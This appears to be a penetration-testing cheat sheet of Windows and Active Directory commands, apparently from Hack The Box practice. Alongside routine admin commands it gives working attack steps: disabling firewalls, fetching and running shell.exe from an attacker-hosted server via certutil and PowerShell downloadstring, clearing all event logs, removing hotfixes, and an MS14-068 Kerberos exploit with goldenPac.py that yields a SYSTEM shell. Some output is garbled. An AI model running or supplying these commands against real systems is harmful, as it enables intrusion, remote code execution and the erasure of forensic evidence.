Windows Administration and Security
-----------------------------------


#RDP from Linux
rdesktop -u Administrator -p test1test! x.x.x.x
xfreerdp -f -u Administrator -p test1test! x.x.x.x



#Disable firewall win xp
C:\WINDOWS\system32>netsh firewall set opmode mode=DISABLE
netsh firewall set opmode mode=DISABLE
Ok.



#Disable firewall 10/8/7/server 2008/Vista
c:\windows\system32\inetsrv>netsh advfirewall set currentprofile state off
netsh advfirewall set currentprofile state off
Ok.



#Shows temporary storage location
C:\>echo %temp%
echo %temp%
C:\Windows\TEMP



#Python file hosting on Linux (Red Team)
#Save file in directory Shell.exe
sudo python2.7 -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...



#Windows (Blue team) to download the file from cmdline
#Downloads Shell.exe
#Saves shell.exe in %temp%
#Runs %temp%/shell.exe
C:\Users\Blue Team> certutil -urlcache -split -f http://x.x.x.x/shell.exe %temp%/shell.exe && %temp%/shell.exe



#List Windows running processes
C:\WINDOWS\system32>tasklist
tasklist

Image Name                   PID Session Name     Session#    Mem Usage
========================= ====== ================ ======== ============
System Idle Process            0 Console                 0         28 K
System                         4 Console                 0        236 K
smss.exe                     316 Console                 0        384 K



#Add a Windows user
C:\WINDOWS\system32>net user username userpassword /ADD
net user username userpassword /ADD
The command completed successfully.



#Add to domain
C:\WINDOWS\system32>net user username password /ADD /DOMAIN



#List Windows Users
C:\WINDOWS\system32>net user
net user

User accounts for \\

-------------------------------------------------------------------------------
username                 Administrator            Guest                    
HelpAssistant            john                     SUPPORT_388945a0         
test                     



#Change Administrator password
c:\windows\system32>net user Administrator test1test!
net user Administrator test
The command completed successfully.



#List Windows local user directories
C:\WINDOWS\system32>dir /b "C:\Users"      
dir /b "C:\Users"
add
Administrator
All Users
john



#Windows show Date
C:\WINDOWS\system32>date /t
date /t
ãîæ 31/10/2019 



#Windows show Time
C:\WINDOWS\system32>time /t
time /t
11:49 ææ



#Windows show uptime/system information
C:\WINDOWS\system32>systeminfo 
systeminfo 



#Save system information for exploit gathering
C:\WINDOWS\system32>systeminfo > systeminfo
systeminfo 

#Upload from Blue Team(Windows) to Red Team (Linux)

#Red Team (Linux) checks against possible vulnerabilites 
git clone https://github.com/GDSSecurity/Windows-Exploit-Suggester.git
cd Windows-Exploit-Suggester
python2.7 windows-exploit-suggester.py --update
python2.7 windows-exploit-suggester.py --database 2019-10-27-mssb.xls --systeminfo systeminfo.txt



#Windows write into a file
C:\WINDOWS\system32>echo test > test
echo test > test



#Windows read file contents
C:\WINDOWS\system32>type test
type test
test 



#Windows show current directory
c:\Users>echo %CD%
c:\Users>



#Windows show current role
c:\Users>whoami
whoami
nt authority\system



#NT AUTHORITY\SYSTEM and BUILTIN\Administrators SIDs; these accounts have access to most system objects. 



#Windows List services
c:\windows\system32>net start
net start
These Windows services are started:

   Application Experience
   Application Host Helper Service
   Base Filtering Engine



#Stop/Start a Windows service
net stop <name>
net start <name>
net pause <name>
net continue <name>



#Enable RDP (Remote Desktop Protocol) via the registry in cmdline
c:\windows\system32>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
The operation completed successfully.



#Windows open a link using the default browser
c:\windows\system32>start "link" https://google.com



#Windows Powershell clear eventviewer logs
PS>wevtutil el | Foreach-Object {wevtutil cl "$_"}



#Windows remove a hotfix
C:\Users\Blue Team\Desktop>wusa.exe /uninstall /KB:3014442  
wusa.exe /uninstall /KB:3014442 



#Save shell.php in the directory you are running the python server on the Red Team host(Linux)
sudo python2.7 -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...



#Windows Powershell download a file
$client = new-object System.Net.WebClient
$client.DownloadFile("http://x.x.x.x/shell.php","c:\location\shell.php")
$client.DownloadFile("http://x.x.x.x/shell.php","shell.php")


#Windows Check filepermissions cmdline
c:\> icacls c.ps1
c.ps1 NT AUTHORITY\SYSTEM:(F)
      BUILTIN\Administrators:(F)
      Everyone:(F)
      BUILTIN\Users:(F)

Successfully processed 1 files; Failed processing 0 files

#powershell
Get-Acl | fl


    Directory: C:\


Path                       Owner                      Access                   
----                       -----                      ------                   
sysadmscripts              BUILTIN\Administrators     CREATOR OWNER Allow  F...

Get-Acl

#Powershell get writeable files in directory
PS C:\> Get-ChildItem | Get-Acl | fl
PS C:\> Dir | Get-Acl | fl
Path                       Owner                      Access                   
----                       -----                      ------                   
c.ps1                      BUILTIN\Administrators     Everyone Allow  FullCo...
del_logs.bat               BUILTIN\Administrators     Everyone Allow  ReadAn...



#Power shell download file
#Where x.x.x.x is the RedTeam (Attacker) running a python server
powershell "(new-object System.Net.WebClient).Downloadfile('http://x.x.x.x:80/shell.exe', 'shell.exe')

C:\BlueTeam>powershell "iex(new-object net.webclient).downloadstring('http://x.x.x.x/exploit.html')"



#Scan smb 
smbclient -L //x.x.x.x
directory_create_or_exist: mkdir failed on directory /var/cache/samba/msg.lock: Permission denied
Unable to initialize messaging context
Enter WORKGROUP\RedTeams's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Share           Disk      
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.40 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available



#Linux Connect to fileshare
smbclient -k -U username \\\\hostname.domain.local\\C$

smb: \> more \USERS\username\Desktop\root.txt



#Scan SMB once have user & password
smbspider -ip x.x.x.x -s SHARENAME -u USERNAME -p PASSWORD
 ____________________________________________
 |'-._(   /                                 |
 | \  .'-._\                           ,   ,|
 |-.'    .-;    SMB Spider           .'\`-' |
 |   \  .' (    v1.0 beta         _.'   \   |
 |.--.'   _)                   ;-;       \._|
 |    ` _\(_)/_                 \ `'-,_,-'\ |
 |______ /(O)\  ________________/____)_`-._\|

Starting thread for x.x.x.x



#Find host information
nbtstat -A x.x.x.x



#Connect to domain on Linux
rpcclient -U domain\\username x.x.x.x
Unable to initialize messaging context
Enter HTB\username's password: 
rpcclient $> 



#Look up SID for accounts once connected over rpc
rpcclient $> lookupnames username
username S-1-5-21-4220043660-4019079961-2895681657-1103 (User: 1)
rpcclient $> lookupnames Administrator
Administrator S-1-5-21-4220043660-4019079961-2895681657-500 (User: 1)



#First Add the hostname to /etc/hosts
#Linux Kerbose exploit
pykek -u usename@domain.local -d hostname.domain.local -p password -s S-1-5-21-4220043660-4019079961-2895681657-1103
password for RedTeam: 
  [+] Building AS-REQ for mantis.htb.local... Done!
  [+] Sending AS-REQ to mantis.htb.local... Done!
  [+] Receiving AS-REP from mantis.htb.local... Done!
  [+] Parsing AS-REP from mantis.htb.local... Done!
  [+] Building TGS-REQ for mantis.htb.local... Done!
  [+] Sending TGS-REQ to mantis.htb.local... Done!
  [+] Receiving TGS-REP from mantis.htb.local... Done!
  [+] Parsing TGS-REP from mantis.htb.local... Done!
  [+] Creating ccache file 'TGT_username@htb.local.ccache'... Done!



cp /usr/share/pykek/TGT_username@domain.local.ccache /tmp/krb5cc_0



/usr/bin/goldenPac.py domain.local/username@hostname.domain.local
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

Password:
[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
[*] Forest SID: S-1-5-21-4220043660-4019079961-2895681657
[*] Attacking domain controller mantis.htb.local
[*] hostname.domain.local found vulnerable!
[*] Requesting shares on mantis.htb.local.....
[*] Found writable share ADMIN$
[*] Uploading file PhtzPAXI.exe
[*] Opening SVCManager on hostname.domain.local.....
[*] Creating service sQjR on hostname.domain.local.....
[*] Starting service sQjR.....
[!] Press help for extra shell commands                                        Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>



#Check kerberos authentication
kinit -V hostname@domain.local
Using default cache: /tmp/krb5cc_1002
Using principal: username@domain.local
kinit: Cannot find KDC for realm "domain.local" while getting initial credentials



#Use impacket (services.py) to list services

psexec.py

#List Service powershell (requires elevation)
Get-Service | Where Status -eq "Running" | Out-GridView
sc query type= service



#Powershell unzip file one line
Add-Type -AssemblyName System.IO.Compression.FileSystem; function Unzip { param([string]$zipfile, [string]$outpath); [System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath); }; Unzip "C:\Users\BlueTeam\backup.zip" "C:\temp\unzip"



#TaskScheduler list taskes
Get-ScheduledTask | Where State -ne "Disabled" | Select TaskName
Get-ScheduledTask | Where TaskName -eq "delete_logs" | Get-ScheduledTaskInfo
Export-ScheduledTask -Taskname delete_logs



#Run command dir
cmd /C dir /Q /R
 Volume in drive C has no label.
 Volume Serial Number is 143B-1804

 Directory of C:\Windows\system32

11/02/2019  08:49 AM    <DIR>          NT SERVICE\TrustedInsta.
11/02/2019  08:49 AM    <DIR>          NT SERVICE\TrustedInsta..
03/18/2014  02:25 AM    <DIR>          NT SERVICE\TrustedInsta0409
06/18/2013  07:48 AM  7 PM     268800 AppXDeploymentClient.dll          
-a---          2/8/2016   8:44 AM     955392 AppXDeploymen[P$] minion\decoder@MINION Users> 



#Powershell zipfile password
Get-Item -Path backup.zip -stream *



   FileName: C:\Users\BlueTeam\backup.zip

Stream                   Length
------                   ------
:$DATA                   103297
pass                         34



#Powershell get hash of zip in windows
get-content backup.zip -str pass



#Show hash of password for zip file in windows
C:\>type C:\Users\BlueTeam\backup.zip:pass
28a5d1e0c15af9f8fce7db65d75bbf17




#Execute cmdline application
cmd /c 'application.exe'



#Authenticate over the share
net use I: \\x.x.x.x\C$ /user:administrator "1234test"
type I:\Users\Administrator\Desktop\root.txt